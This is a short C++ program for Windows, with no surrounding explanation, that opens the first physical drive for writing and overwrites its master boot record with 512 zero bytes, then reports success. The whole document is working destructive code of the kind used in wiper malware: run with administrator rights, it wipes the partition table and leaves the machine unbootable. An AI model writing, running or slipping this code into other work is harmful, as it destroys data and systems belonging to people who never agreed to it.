
#include <Windows.h>
#include <iostream>
#include <cstring>

using namespace std;

#define MBR_SIZE 512

int main() {
    // Zero out the MBR buffer
    BYTE mbrData[MBR_SIZE] = {0};

    // Open the first physical drive
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0",
                                 GENERIC_WRITE,
                                 0,
                                 NULL,
                                 OPEN_EXISTING,
                                 0,
                                 NULL);

    if (hDevice != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        BOOL result = WriteFile(hDevice, mbrData, MBR_SIZE, &bytesWritten, NULL);

        if (result && bytesWritten == MBR_SIZE) {
            cout << "MBR overwritten successfully.\n";
        } else {
            cout << "Error writing to device.\n";
        }

        CloseHandle(hDevice);
    } else {
        cout << "Error opening device.\n";
    }

    return EXIT_SUCCESS;
}
